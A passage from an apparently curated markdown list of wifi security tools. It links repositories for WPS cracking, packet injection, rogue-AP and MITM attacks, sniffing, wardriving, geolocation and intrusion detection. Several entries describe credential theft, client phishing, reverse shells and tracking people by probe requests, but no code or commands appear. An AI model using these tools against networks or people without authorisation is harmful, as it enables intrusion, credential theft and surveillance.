elements.\n* [wpsoffline](https://bitbucket.org/dudux/wpsoffline/) - PoC for routers vulnerable with WPS and deficiencies in their PRNG state\n* [Wps-scripts](https://github.com/0x90/wps-scripts/) - WPS hacking scripts\n* [Wps-Ultimate-Cracker](https://github.com/younextvictim/Wps-Ultimate-Cracker/) - This script will help help you to get the most of router in morocco by using pixiewps , reaver , aircrack-ng ,wifite \n#### Others\n* [apbleed](https://github.com/vanhoefm/apbleed/) - Allows you to use existing heartbleed tools to test the RADIUS server\n* [eapmd5pass](http://www.willhackforsushi.com/?page_id=67) - An implementation of an offline dictionary attack against the EAP-MD5 protocol. This utility can be used to audit passwords used for EAP-MD5 networks from wireless packet captures, or by manually specifying the challenge, response and associated authentication information.\n* [haircrack](https://github.com/AdamKnube/haircrack/) - Automated aircrack/reaver/pyrit (An interface for aircrack/reaver/pyrit written in python. The interface itself may never get finished.)\n* [IKECrack](http://ikecrack.sourceforge.net/) - IKE/IPSec authentication crack tool. This tool is designed to bruteforce or dictionary attack the key/password used with Pre-Shared-Key [PSK] IKE authentication.\n* [Wpe-parse](https://github.com/sa7mon/wpe-parse/) - This is a simple parsing script to convert output from hostapd-wpe (which makes John the Ripper-formatted logs) to Hashcat format. \n### Injection\n* [Aggr-inject](https://github.com/rpp0/aggr-inject/) - Remote frame injection PoC by exploiting a standard compliant A-MPDU aggregation vulnerability in 802.11n networks. \n* [Aircrack-db](https://github.com/SaltwaterC/aircrack-db/) - A list of wireless cards tested with the dual-card injection test and in the field\n* [airown](https://github.com/sh0/airown/) - Packet injection tool\n* [airpwn](https://github.com/M0Rf30/airpwn/) - A generic packet injection tool for 802.11 networks.\n* [Airpwn-ng](https://github.com/ICSec/airpwn-ng/) - New and improved version of airpwn\n* [Iitis-generator](https://github.com/iitis/iitis-generator/) - Software for distributed statistical evaluation of IEEE 802.11 wireless networks using Linux mac80211 packet injection facility\n* [libfcap](https://github.com/teddyyy/libfcap/) - Library for manipulate 802.11 frame in monitor mode\n* [libmoep](https://github.com/0x90/wifi-arsenal/tree/master/libmoep-1.1/) - Allows for frame injection on monitor mode devices with per-frame radiotap options such as TX rate / MCS index and RTS/CTS protection\n* [Lorcon-examples](https://github.com/OpenSecurityResearch/lorcon_examples/) - Various examples and patches for LORCON\n* [lorcon](https://code.google.com/archive/p/lorcon/) - A common injection and control library for wireless packet crafting\n* [lrc](https://github.com/0x0d/lrc/) - Fast Wi-Fi hijacker in C, based on AirPwn ideas and LORCON\n* [moepdefend](https://github.com/moepinet/moepdefend/) - Example monitoring/injection tool based on libmoep\n* [packetinjector](https://github.com/juzna/packet-injector/) - Packet analyzer and injector, written in JavaScript\n* [packetvector](https://github.com/derosier/packetvector/) - 802.11 management packet injection tool based on packetspammer\n* [pylorcon2](https://github.com/tom5760/pylorcon2/) - Pure Python wrapper for the LORCON library. \n* [wifitap](https://github.com/viscousliquid/wifitap/) - WiFi injection tool through tun/tap device\n* [wiwo](https://github.com/CoreSecurity/wiwo/) - Wiwo is a distributed 802.11 monitoring and injecting system that was designed to be simple and scalable\n* [wperf](https://github.com/anyfi/wperf/) - 802.11 frame injection/reception tool for Linux mac80211 stack\n### Rogue AP/Fake AP/ MITM\n* [Aerial](https://github.com/Nick-the-Greek/Aerial/) - Multi-mode wireless LAN Based on a Software Access point for Kali Linux.\n* [AIRBASE-NG-SSLSTRIP-AIRSTRIP- ](https://github.com/MrMugiwara/AIRBASE-NG-SSLSTRIP-AIRSTRIP-/) - AIRBASE-NG + SSLSTRIP = AIRSTRIP\n* [cupid](https://github.com/lgrangeia/cupid/) - Patch for hostapd and wpa_supplicant to attempt to exploit heartbleed on EAP-PEAP/TLS/TTLS connections\n* [FakeAP](https://github.com/DanMcInerney/fakeAP/) - Create fake AP in Kali with 1 command \n* [fakeaps](https://github.com/0x90/wifi-arsenal/blob/master/fakeaps.c/) - Fake Access Points using Atheros wireless cards in Linux\n* [fluxion](https://github.com/FluxionNetwork/fluxion/) - Fluxion is the future of MITM WPA attacks\n* [FuzzAP](https://github.com/lostincynicism/FuzzAP/) - A python script for obfuscating wireless networks\n* [Hostapd-karma](https://github.com/xtr4nge/hostapd-karma/) - DigiNinja patches to hostapd for rogue access points. \n* [Hostapd-wpe-extended](https://github.com/NerdyProjects/hostapd-wpe-extended/) - Modification and tools for using hostapd for rogue AP attacks impersonating WPA-Enterprise networks to steal user credentials\n* [Hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe/) - Modified hostapd to facilitate AP impersonation attacks \n* [karma](https://github.com/atimorin/karma/) - KARMA Attacks Radioed Machines Automatically (KARMA)\n* [mana](https://github.com/sensepost/mana/) - Our mana toolkit for wifi rogue AP attacks and MitM \n* [mitmAP](https://github.com/xdavidhu/mitmAP/) - A python program to create a fake AP and sniff data\n* [Mitm-helper-wifi](https://github.com/jakev/mitm-helper-wifi/) - Make it easy and straight-forward to configure a Ubuntu virtual machine to act as a WiFi access point (AP)\n* [Mitm-rogue-WiFi-AP](https://github.com/wshen0123/mitm-rogue-WiFi-AP/) - MITM Attack Example Code with Rogue Wi-Fi AP\n* [openrtls](https://github.com/konker/openrtls/) - \n* [Platform-hostapd](https://github.com/experimental-platform/platform-hostapd/) - Wireless access point for experimental-platform. \n* [PwnSTAR](https://github.com/SilverFoxx/PwnSTAR/) - PwnSTAR (Pwn SofT-Ap scRipt) - for all your fake-AP needs\n* [rogue_ap](https://github.com/andrew14824/rogue_ap/) - RogueAP_hostapd.py is a script designed to create a Rogue Access Point\n* [rogueap](https://github.com/wouter-glasswall/rogueap/) - Start a rogue access point with no effort, with support for hostapd, airbase, sslstrip, sslsplit, tcpdump builtin\n* [rogueDetect](https://github.com/olanb7/rogueDetect/) - \n* [RogueSploit](https://github.com/H0nus/RogueSploit/) - Powerfull Wi-Fi trap\n* [Rspoof](https://github.com/zackiles/Rspoof/) - Wifi Automated Fake HotSpot Hijacking with aicrack-ng, airbase, ssl-strip, and dns spoof in Python\n* [Scapy-fakeap](https://github.com/rpp0/scapy-fakeap/) - Fake wireless Access Point (AP) implementation using Python and Scapy\n* [snifflab](https://github.com/andrewhilts/snifflab/) - Scripts to create your own MITM'ing, packet sniffing WiFi access point \n* [startools](https://github.com/sa7mon/startools/) - To use a RasPi to do an Evil Twin attack and capture 802.1x RADIUS creds\n* [wifi_honey](https://github.com/0x90/wifi-arsenal/tree/master/wifi_honey/) - Setting up four fake access points, each with a different type of encryption, None, WEP, WPA and WPA2 and the seeing which of the four the client connects to\n* [wifiphisher](https://github.com/wifiphisher/wifiphisher/) - Automated victim-customized phishing attacks against Wi-Fi clients\n* [WiFi-Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin/) - Framework for Rogue Wi-Fi Access Point Attack\n* [wifisoftap](https://github.com/coolshou/wifisoftap/) - \n* [Wifi_Trojans](https://github.com/ahhh/Wifi_Trojans/) - Collection of wireless based bind and reverse connect shells for penetration testers\n### Sniffing\n* [Airodump-iv](https://github.com/ivanlei/airodump-iv/) - A python implementation of airodump-ng\n* [Airodump-logger](https://github.com/atiti/airodump-logger/) - Logging clients with airodump-ng\n* [Airport-sniffer](https://github.com/zhovner/airport-sniffer/) - Very simple Wi-Fi sniffer and dump parser for built-in macbook AirPort Extreme card. Only native MacOS tools used. \n* [airtraf](https://github.com/saintkepha/airtraf/) - Wireless 802.11 network sniffer and analyzer\n* [darm](https://github.com/eldraco/darm/) - Intelligent network sniffer for the masses\n* [datasamalen](https://github.com/4ZM/datasamalen/) - Pick up wifi-probe requests\n* [DeSniffer](https://github.com/wirelesshack/DeSniffer/) - 802.11 wireless sniffer\n* [dot11sniffer](https://github.com/DepthDeluxe/dot11sniffer/) - Sniffs 802.11 traffic and counts the number of active wireless devices in an area\n* [eap_detect](https://github.com/rafikMeg/eap_detect/) - A simple script using the python library Scapy to detect the 802.1X authentication mechanism\n* [handshakeharvest](https://github.com/0x90/wifi-arsenal/blob/master/handshakeharvest-K1-K2-K2016-4-0.sh/) - \n* [liber80211](https://github.com/brycethomas/liber80211/) - 802.11 monitor mode for Android without root\n* [libpcap-80211-c](https://github.com/weaknetlabs/libpcap-80211-c/) - Sniffs on a RFMON-enabled device for a beacon when compiled, linked and loaded\n* [mac80211-user](https://github.com/chillancezen/mac80211-user/) - Intercept 80211 data frame and put it into userspace\n* [milicone](https://github.com/jazoza/milicone/) - Investigating interaction with wireless communication traffic\n* [Mr-nosy](https://github.com/jgumbley/mr-nosy/) - Liked to know about everything that was going on\n* [mupe](https://github.com/DE-IBH/mupe/) - MUltiPath Estimator - Create statistical analysis of 802.11 Radiotap sniffs\n* [Naive-project](https://github.com/veenfang/naive_project/) - \n* [Native-WiFi-API-Beacon-Sniffer ](https://github.com/6e726d/Native-WiFi-API-Beacon-Sniffer/) - Tool that dumps beacon frames to a pcap file. Works on Windows Vista or Later with any Wireless Card\n* [oculus](https://github.com/abnarain/oculus/) - Lightweight tool to collect traces from wifi\n* [ofxSniffer](https://github.com/HalfdanJ/ofxSniffer/) - Wrapper for the libtins library. Libtins can be used to sniff network packages, or to generate network pacakages yourself.\n* [phystats](https://github.com/ransford/phystats/) - Gather & plot ieee80211 counters from Linux debugfs\n* [probecap](https://github.com/hydrogen18/probecap/) - A quick and dirty utility to capture and store WiFi probes.\n* [probemon](https://github.com/jjb3tee3/probemon/) - Monitors 802.11 probe packets sent from roaming mobile devices. Developed using PyLorcon2. \n* [probesniffer](https://github.com/xdavidhu/probeSniffer/) - A tool for sniffing unencrypted wireless probe requests from devices\n* [rifsniff](https://github.com/dappiu/rifsniff/) - Remote Interface Sniffer\n* [ScapyGELFtoGraylog2](https://github.com/wouterbudding/ScapyGELFtoGraylog2/) - Sniff some 802.11 packages and send the date and MAC with GELF UDP to Graylog2\n* [Scapy-wireless-scanner](https://github.com/rahilsharma/Scapy-wireless-scanner/) - Simple wireless scanner built using Scapy Library\n* [SSIDentity](https://github.com/SamClarke2012/SSIDentity/) - Passive sniffing of 802.11 probe requests, stored in a central database.\n* [TCP-SeqNum](https://github.com/bwoolf1122/TCP-SeqNum/) - Means to sniff 802.11 traffic and obtain TCP session info using netfiter_queue. Use that data to construct a packet in scappy. \n* [wallofshame](https://github.com/0x0d/wallofshame/) - Multi protocol sniffer, created for ChaosConstruction conference HackSpace\n* [Watcher](https://github.com/catalyst256/Watcher/) - Canari framework based Maltego transform pack that allows you to perform wireless sniffing within Maltego\n* [WiFi-802.11-Demo-Sniffer](https://github.com/dcrisan/WiFi-802.11-Demo-Sniffer/) - This 802.11 sniffer written in Python provides a useful tool to raise awareness at the amount of data phones release for anyone to read. \n* [Wifi-harvester](https://github.com/SYWorks/wifi-harvester/) - For collecting probed SSID name by wireless devices, Access point detail and connected clients.\n* [wifijamMac](https://github.com/rajkotraja/wifiJamMac/) - Allows you to select one or more nearby wireless networks, thereupon presenting a list of clients which are currently active on the network(s)\n* [Wifimon](https://github.com/Wifimon/Wifimon/) - Wi-fi 802.11 Beacon Frame sniffer\n* [Wifi-scan](https://bitbucket.org/edkeeble/wifi-scan/) - Short python script scans for probe requests from whitelisted WiFi clients\n* [wifispy](https://github.com/Geovation/wifispy/) - Sniff Wifi traffic, log device addresses\n* [Wireless-info](https://github.com/wlanslovenija/wireless-info/) - Obtain information about wireless interfaces from MAC80211 stack\n* [Wireless-radar](https://github.com/stef/wireless-radar/) - DF and other tools to explore a 2.4GHz environment\n* [Wireless-Sniffer](https://github.com/gauravpatwardhan/Wireless-Sniffer/) - A 802.11 wireless sniffer tool (c-based)\n### Wardriving\n* [MappingWirelessNetworks](https://github.com/jeffThompson/MappingWirelessNetworks/) - Code, data, and (possibly) schematics for recording wireless network data around a city\n* [WAPMap](https://github.com/pan0pt1c0n/WAPMap/) - Parse Kismet .netxml output and then return a CSV file that can be uploaded to Google Maps Engine to map WEP or OPEN networks\n* [warcarrier](https://github.com/0x90/warcarrier/) - An NCURSES-based, all-in-one instrument panel for professional Wardriving\n* [WifiScanAndMap](https://github.com/cyberpython/WifiScanAndMap/) - A Linux Python application to create maps of 802.11 networks\n### Miscellaneous Attacking Tools\n* [80211scrambler](https://github.com/travisgoodspeed/80211scrambler/) - Small collection of tools in Verilog for working\n* [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon/) - This is a multi-use bash script for Linux systems to audit wireless networks\n* [airodump_mar_attack](https://github.com/maroviher/airodump_mar_attack/) - Maroviher attack\n* [AirPirate](https://github.com/gat3way/AirPirate/) - Android 802.11 pentesting tool \n* [airspf](https://github.com/davll/airspf/) - AirSpoof/Airpwn ??\n* [airxploit](https://github.com/balle/airxploit/) - Wireless discovery and exploitation framework written in Python\n* [AtEar](https://github.com/NORMA-Inc/AtEar/) - Wireless Hacking, WiFi Security, Vulnerability Analyzer, Pentestration\n* [BoopSuite](https://github.com/MisterBianco/BoopSuite/) - A Suite of Tools written in Python for wireless auditing and security testing.\n* [chap2aleap](https://github.com/xiao106347/chap2asleap/) - Work with asleap+genk\n* [CloudCrackInstaller](https://github.com/tjetzinger/CloudCrackInstaller/) - Script which installs Crunch, Pyrit and Cowpatty on a running Amazon EC2 Cluster GPU Instance to crack WPA and WPA2 keys.\n* [Crippled](https://github.com/Konsole512/Crippled/) - WPA/WPA2 Belkin.XXXX, Belkin_XXXXXX, belkin.xxx and belkin.xxxx router default key generator.\n* [eapeak](https://github.com/securestate/eapeak/) - Analysis Suite For EAP Enabled Wireless Networks\n* [Easy-creds](https://github.com/brav0hax/easy-creds/) - Leverages tools for stealing credentials during a pen test\n* [FruityWiFi](https://github.com/xtr4nge/FruityWifi/) - Wireless network auditing tool\n* [Hijacker](https://github.com/chrisk44/Hijacker/) - Aircrack, Airodump, Aireplay, MDK3 and Reaver GUI Application for Android\n* [killosx](https://github.com/d4rkcat/killosx/) - Use the Apple CoreText exploit (CVE-2012-3716) and launch an AP to affect all devices within wifi range \n* [LANs.py](https://github.com/DanMcInerney/LANs.py/) - Inject code, jam wifi, and spy on wifi users\n* [Null-packet-wifi-promt](https://bitbucket.org/edkeeble/null-packet-wifi-prompt/) - Simple script to prompt responses from wireless devices with a known MAC address\n* [PiWAT](https://github.com/Crypt0s/PiWAT/) - Wireless Attack Toolkit\n* [Python-wireless-attacks](https://github.com/jordan-wright/python-wireless-attacks/) - Wireless Attacks in Python (Based on blog series)\n* [Secpi](https://github.com/nrohsak/Secpi/) - Python based script for wifi pentesting on the RasPi\n* [Sly-fi](https://github.com/sinistermachine/sly-fi/) - Wifi pwnage automation\n* [smoothie](https://github.com/XayOn/smoothie/) - Web based wireless auditory tools\n* [WHAT-PRO](https://github.com/smoz1986/WHAT-PRO/) - 802.11 Exploitation Tool for use with Kali 2. More tools available than WHAT or WHAT Pi \n* [Wi-door](https://github.com/Vivek-Ramachandran/wi-door/) - Wi-Fi Backdoors\n* [WIDSTT](https://github.com/0x90/wifi-arsenal/blob/master/Wireless%20IDS%20Tool.py/) - Wireless Intrusion Detection Systems Testing Tool – test your WIDS by performing attacks\n* [WifiAttack](https://github.com/AbbySec/WifiAttack/) - \n* [wifi-default-password](https://bitbucket.org/jpgerek/wifi-default-password/) - Bash script that tries all the default passwords for a particular wifi access point\n* [wifimonster](https://github.com/flankerhqd/wifimonster/) - Wifi sniffing and hijacking tool\n* [wifuzz](https://github.com/0x90/wifuzz/) - Access Point 802.11 stack fuzzer\n* [wifuzzit](https://github.com/0xd012/wifuzzit/) - A 802.11 wireless fuzzer\n* [wtf](https://github.com/cozybit/wtf/) - Wireless Test Framework. Collection of test suites for validating various wifi functionality on various wifi devices.\n* [zarp](https://github.com/hatRiot/zarp/) - Network attack tool centered around the exploitation of local networks\n## Information Gathering\n* [3WiFi Database](https://github.com/binarymaster/3WiFi/) - Collect data from Router Scan log reports, search for access points, obtain its geolocation coordinates, and display it on world map\n* [access_points](https://github.com/kootenpv/access_points/) - Scan your WiFi and get access point information and signal quality\n* [Accumulation-rssi](https://github.com/h3pr5tq/accumulation-rssi/) - Linux utility for accumulation of WiFi RSSI to text file. Using nl80211, Managed mode. Useful for experiments with WiFi (example, localization)\n* [airscan](https://github.com/trou/airscan/) - Wi-Fi scanning utility for the Nintendo DS\n* [basiciw](https://github.com/enkore/basiciw/) - Retrieve information such as ESSID or signal quality from wireless cards (Python module)\n* [Get-rssi](https://github.com/h3pr5tq/get-rssi/) - Linux utility for getting RSSI WiFi of APs to text file. Using Monitor mode, libpcap.\n* [IndoorPositionr](https://github.com/otherview/IndoorPositionr/) - Indoor positioning using Android to provide the surrounding Access Points signals and guess the position\n* [Isniff-GPS](https://github.com/hubert3/iSniff-GPS/) - Passive sniffing tool for capturing and visualising WiFi location data disclosed by iOS devices\n* [rssi](https://github.com/AravinthPanch/rssi/) - Indoor localisation using RSSI. RSSI is received signal strength indicator in IEEE 802.11 beacon packet to announce the presence of WiFi\n* [whoishere](https://github.com/hkm/whoishere.py/) - WIFI Client Detection - Identify people by assigning a name to a device performing a wireless probe request.\n* [Wifi-Dumper](https://github.com/Viralmaniar/Wifi-Dumper/) - Dump the wifi profiles and cleartext passwords of the connected access points on the Windows machine\n* [Wifi-monitor](https://github.com/eye9poob/Wifi-monitor/) - Prints the IPs on your local network that're sending the most packets ack = 802.11 control frame acknowledgement or …\n* [WIG](https://github.com/6e726d/WIG/) - Tools for 802.11 information gathering. \n## Defence/Detection\n* [badkarma](https://github.com/atechdad/badkarma/) - BadKarma is a simple python script used to detect and disrupt rouge access points/honeypots using the karma attack such as the wifi pineapple\n* [EvilAP_Defender](https://github.com/moha99sa/EvilAP_Defender/) - Protect your Wireless Network from Evil Access Points\n* [huntpineapples](https://github.com/0x90/wifi-arsenal/tree/master/huntpineapples/) - WiFi Pineapple hunter from DC23\n* [KisMac2](https://github.com/IGRSoft/KisMac2/) - Free, open source wireless stumbling and security tool for Mac OS X\n* [kismetclient](https://github.com/PaulMcMillan/kismetclient/) - A Python client for the Kismet server protocol\n* [kismet](https://github.com/kismetwireless/kismet/) - Wireless network detector, sniffer, and intrusion detection system\n* [kismon](https://github.com/Kismon/kismon/) - A GUI client for kismet\n* [Openwips-ng](https://github.com/aircrack-ng/OpenWIPS-ng) - Open source and modular Wireless IPS (Intrusion Prevention System)\n* [Python-kismet](https://code.google.com/archive/p/python-kismet/) - Python threaded listener to Kismet broadcasts\n* [RogueDetection](https://github.com/baggybin/RogueDetection/) - Rogue Access Point Detection and WIDS\n* [waidps](https://github.com/SYWorks/waidps/) - Wireless Auditing, Intrusion Detection & Prevention System\n* [Wave](https://github.com/hkparker/Wave/) - 802.11 IDS, visualizer, and analytics platform for the web\n* [Wireless-forensics-framework](https://github.com/nipunjaswal/Wireless-forensics-framework/) - Automated Wireless Penetration Testing and Carrying out Wireless Forensics in Python\n* [Wireless-ids](https://github.com/SYWorks/wireless-ids/) - Ability to detect suspicious activity such as (WEP/WPA/WPS) attack by sniffing the air for wireless packets\n* [wmd](https://github.com/securestate/wmd/) - Simple solution for the detection and location of Rogue Access Points.\n* [wraith](https://github.com/wraith-wireless/wraith/) - Wireless Reconnaissance And Intelligent Target Harvesting\n* [wspy](https://github.com/Nan-Do/wspy/) - Python tool to create a wireless ids it detects which clients are connected to a network to allow the creation of usage patterns of a netowrk by the clients\n## Libraries/General Purpose Tools\n* [80211p_raw](https://github.com/allanmatthew/80211p_raw/) - Raw socket utilities for 802.11p transmission\n* [80211_raw](https://github.com/MinimumLaw/80211_raw/) - Sender and receiver for WiFi (IEEE802.11) network with raw sockets \n* [banjax](https://github.com/0x90/banjax/) - Library for low-level programming of IEEE 802.11 wireless network interfaces on the GNU/Linux operating system\n* [dot11er](https://github.com/timow/dot11er/) - Some tools for playing with IEEE802.11\n* [Frame-utils.js](https://github.com/rhodey/frame-utils.js/) - A collection of utilities for processing streams of 80211 frames and radiotap headers.\n* [Gopacket-80211](https://github.com/dutchcoders/gopacket-80211/) - Extra gopacket layers for Radiotap and 802.11 (has been integrated in Gopacket) \n* [itamae](https://github.com/wraith-wireless/itamae/) - 802.11 radiotap and MPDU parser \n* [Libairpcap-nl](https://github.com/hbock/libairpcap-nl/) - Implementation of AirPcap library, targetting the NL80211 protocol. \n* [libuwifi](https://github.com/br101/libuwifi/) - C library for parsing, generating and analyzing Wifi (WLAN 802.11) frames in userspace and related functions\n* [packetparser](https://github.com/flupzor/packetparser/) - IEEE 802.11 packetparser\n* [pcap2xml](https://github.com/securitytube/pcap2xml/) - Convert 802.11 Packet Traces to XML and SQLITE Format \n* [PCS](https://github.com/gvnn3/PCS/) - Set of Python modules and objects that make building network protocol code easier for the protocol developer\n* [Probr-core](https://github.com/probr/probr-core/) - The core-component for generic WiFi tracking: remote device management, packet capturing, packet storage\n* [py80211](https://github.com/0x90/py80211/) - Suite of libraries for parsing 802.11 packets as well as managing wireless cards and working with 802.11 information\n* [PyRIC](https://github.com/wraith-wireless/PyRIC/) - PyRIC (is a Linux only) library providing wireless developers and pentesters the ability to identify, enumerate and manipulate their system's wireless cards programmatically in Python.\n* [python3-wifi](https://github.com/llazzaro/python3-wifi/) - Python WiFi is a Python module that provides read and write access to a wireless network card's capabilities using the Linux Wireless Extensions.\n* [Python-radiotap](https://github.com/bcopeland/python-radiotap/) - Tiny lib for parsing radiotap/802.11 headers in python \n* [python-wifi](https://pypi.python.org/pypi/python-wifi/) - Python WiFi is a Python module that provides read and write access to a wireless network card's capabilities using the Linux Wireless Extensions.\n* [Qca-swiss-army-knife](https://github.com/mcgrof/qca-swiss-army-knife/) - Hosts a set of utilities that we use to debug / help with our driver development\n* [Radioparse](https://github.com/AlexanderSelzer/Radioparse/) - A WiFi protocol parser that can be used with radiotap packets and node-pcap\n* [Scapy](https://github.com/secdev/scapy) - Python-based interactive packet manipulation program & library\n* [Wifi-scan](https://github.com/bmegli/wifi-scan/) - A nl80211 C/C++ library for monitoring signal strength of WiFi networks\n* [wifi-scripts](https://github.com/0x90/wifi-scripts) - Misc scripts and tools for WiFi\n* [wireless](https://github.com/joshvillbrandt/wireless/) - Dead simple, cross-platform Python library to connect to wireless networks\n## Visualization\n* [airview](https://github.com/Crypt0s/airview/) - A python web application compliment to py80211 which allows you to visualize the airwaves around you with your web browser. \n* [speccy](https://github.com/bcopeland/speccy/) - Visualization tool for ath spectral scan\n* [Wifi-contour](https://github.com/bertabus/wifi-contour/) - A contour mapping program of wireless 802.11 signal strength\n* [Wifi-heatmap](https://github.com/beaugunderson/wifi-heatmap/) - Generate heatmaps of wifi coverage with Python\n* [wifiscanvisualizer](https://github.com/securitytube/wifiscanvisualizer/) - Wi-Fi Scan Visualizer by Pentester Academy \n* [Wifi-Signal-Plotter](https://github.com/s7jones/Wifi-Signal-Plotter/) - A Python script for graphing and comparing the WiFi signal strengths between WiFi adaptors in Windows or Linux.\n* [wifivis](https://github.com/mitdbg/wifivis/) - Visualize some mit wifi access point data\n* [wipi](https://github.com/dioh/wipi/) - Visualize the WiFi packages that are floating around us all the time.\n* [Wlan-stats](https://github.com/hughobrien/wlan-stats/) - Tool chain using tshark to pull data from pcaps, further process them in python, and graph the output in R. \n## Localisation\n* [Find-lf](https://github.com/schollz/find-lf/) - Track the location of every Wi-Fi device (📱) in your house using Raspberry Pis and FIND\n* [geowifi](https://github.com/yzfedora/geowifi/) - This is a Geographic WiFi Positioning program written under the Linux.(it is also a WiFi Positioning API written for C language\n* [GrapplingHook](https://github.com/nikseetharaman/GrapplingHook/) - Open Source 802.11 Direction Finder\n* [gtaiad](https://github.com/jedivind/gtaiad/) - Indoor Wi-Fi navigation prototype using triangulation\n* [Openwifimap-api](https://github.com/freifunk/openwifimap-api/) - OpenWiFiMap database and its api \n* [Python Wi-Fi Positioning System](https://github.com/initbrain/Python-Wi-Fi-Positioning-System/) - Python Wi-Fi Positioning System - Wi-Fi geolocation script using the Google Geolocation API \n* [pyWPSLocation](https://github.com/akrv/pyWPSLocalisation/) - Using Python for localisation using Google Geolocation API (GGAPI) and WiFi Positioning System (WPS)\n* [whereami](https://github.com/kootenpv/whereami/) - Uses WiFi signals 📶 and machine learning to predict where you are \n* [Wifi-geolocation](https://github.com/genekogan/wifi_geolocation/) - Get your latitude/longitude via wifi access points\n* [Wifi-localization](https://github.com/utexas-air-fri/wifi_localization/) - Wifi Localization using a map and reference\n* [Wifi-locator](https://github.com/clockfort/wifi-locator/) - Determines physical location of station judging from 802.11 beacons' BSSID/Signal/Noise/Quality information.\n* [Wi-finder](https://github.com/romebop/wi-finder/) - Wi-Fi hotspot finder\n* [Wlan-pos](https://github.com/0x90/wlan-pos/) - Location fingerprinting and triangulation engine for WLAN (IEEE802.11,aka WiFi) environment.\n## Configuration/setup\n* [802.11p-iw ](https://github.com/CTU-IIG/802.11p-iw/) - Wireless configuration tool (UNIX)\n* [agentapd](https://github.com/mengning/agentapd/) - Agent of WiFi hardware\n* [AirLibre](https://github.com/nathanshimp/AirLibre/) - Python API For UBNT AirOS Devices \n* [Atheros-AR9271 ](https://github.com/aaronkish/Atheros-AR9271/) - Kernel Extension for AR9271 chipset (Wireless USB Card)\n* [AtherosROMKit ](https://github.com/andyvand/AtherosROMKit/) - Atheros ROM modding and recovery kit \n* [cac](https://github.com/paulpatras/cac/) - A Centralized Adaptive Control algorithm that optimises the performance of IEEE 802.11 WLANs \n* [captiveportal](https://github.com/bendemott/captiveportal/) - A captive portal that can be used on most linux distributions. \n* [cloudap](https://github.com/mengning/cloudap/) - AP Manager in Cloud,AP Hardware on your side\n* [connme](https://github.com/kurokid/connme/) - Client for Hostapd \n* [crda](https://github.com/mcgrof/crda/) - Central Regulatory Domain Agent\n* [create_ap](https://github.com/oblique/create_ap/) - This script creates a NATed or Bridged WiFi Access Point. \n* [disable-802.11b-snmp](https://github.com/claymichaels/disable-802.11b-snmp/) - A tool to set 802.11 protocols on thousands of Access Points with SNMP.\n* [Do-wifi](https://github.com/ealexeev/do-wifi/) - Command line tool for scanning and connecting to wifi networks in Linux. \n* [full_permissive_unlock_ath](https://github.com/doom5/ath9k_ath5k_full_permissive_unlock_all_channels.patch/) - This kernel patch enable all 2GHZ & 5GHZ channels (without restriction) for ath9k & ath5k forced to use buildin world regulatory\n* [FWAP](https://github.com/szehl/FWAP/) - Minimal, very lightweight access point implementation\n* [hostapd](https://github.com/nims11/hostapd.py/) - Python script to make using and configuring hostapd easier \n* [hostapd](https://w1.fi/hostapd/) - User space daemon for access point and authentication servers\n* [Hostapd-mana](https://github.com/adde88/hostapd-mana/) - Hostapd-mana for the 6.th gen. Wifi Pineapple, and OpenWRT\n* [hostapd-mana-openwrt](https://github.com/adde88/hostapd-mana-openwrt/) - Hostapd-mana - build-files, and installation-files for OpenWRT\n* [Hostapd-with-WebID](https://github.com/yunus/Hostapd-with-WebID/) - WebID integrated hostapd\n* [Hostapd-wpe-openwrt](https://github.com/TarlogicSecurity/hostapd-wpe-openwrt/) - Hostapd-wpe (Wireless Pwnage Edition) packages for OpenWRT Barrier Breaker 14.07 \n* [hotspotd](https://github.com/prahladyeri/hotspotd/) - Simple daemon to create a wifi hotspot on Linux\n* [IEEE802.11-complete](https://github.com/UtkMSNL/IEEE802.11-complete/) - IEEE802.11 protocol, including PHY, MAC, and rate adaptation approaches upon GNURadio/USRP software-defined radio platform\n* [Linux-wifi-tools](https://github.com/R2dR/linux-wifi-tools/) - A set of Linux command line tools for managing and troubleshooting wifi\n* [monmob](https://github.com/tuter/monmob/) - Set of tools to provide monitor mode and raw frame injection for devices using broadcom chipsets bcm4325, bcm4329 and bcm4330\n* [nexmon](https://github.com/seemoo-lab/nexmon/) - The C-based Firmware Patching Framework for Broadcom/Cypress WiFi Chips that enables Monitor Mode, Frame Injection and much more\n* [PyWiWi](https://github.com/6e726d/PyWiWi/) - Python Windows Wifi\n* [reghack](https://github.com/0x90/wifi-arsenal/tree/master/lowlevel/reghack/) - Replaces the regulatory domain rules in the driver binaries with less restrictive ones\n* [RegMon](https://github.com/thuehn/RegMon/) - RegMon is a Atheros WiFi card register monitoring tool for Linux OpenWrt\n* [remoteapd](https://github.com/mengning/remoteapd/) - Remote NL80211-Extent driver for Hostapd 2.0\n* [resfi](https://github.com/resfi/resfi/) - Framework supporting creation of RRM functionality in residential WiFi deployments\n* [rollmac](https://github.com/violentshell/rollmac/) - Automated WiFi limit evasion\n* [RT73-USB-Wireless-](https://github.com/Marchrius/RT73-USB-Wireless-/) - Patched version of RT73USBWireless for Yosemite\n* [RTL8188-hostapd](https://github.com/jenssegers/RTL8188-hostapd/) - Hostapd for Realtek RTL8188\n* [Wifi-ap](https://github.com/foosel/wifi-ap/) - Library wrapper around hostapd and dnsmasq and their respective configuration files that allows for programmatically creating access points in Debian-based Linux environments\n* [Wifi-frequency-hacker](https://github.com/singe/wifi-frequency-hacker/) - A modified frequency regulatory domain configuration that doesn't limit you. \n* [Wifi-pentesting](https://github.com/baldwmic/wifi-pentesting/) - Wifi Penetration Testing of Home Network\n* [WirelessConfig](https://github.com/acidprime/WirelessConfig/) - A 802.1x Python wireless configuration tool with Cocoa wrappers\n## Monitoring\n* [como](https://github.com/JackieXie168/como/) - CoMo is a passive monitoring system that supports arbitrary real time traffic queries\n* [horst](https://github.com/br101/horst/) - Lightweight IEEE802.11 wireless LAN analyzer with a text interface. Its basic function is similar to tcpdump, Wireshark or Kismet, but it's much smaller and shows different, aggregated information which is not easily available from other tools.\n* [scapybase](https://github.com/jahrome/scapybase/) - 802.11 monitor AP based on scapy\n* [Scapy-survey](https://github.com/tuomasb/scapy-survey/) - 802.11 signal strength logger using Scapy\n* [sigmon](https://github.com/tecknowledge/sigmon/) - Modular WiFi/RF Monitoring and Analysis Implementation\n* [Uniband-installer](https://github.com/wi-fi-analyzer/uniband-installer/) - Wireless monitoring framework to help using kismet dumpcap and horst (installation files)\n* [Wifi-linux](https://github.com/dixel/wifi-linux/) - Simple python script to 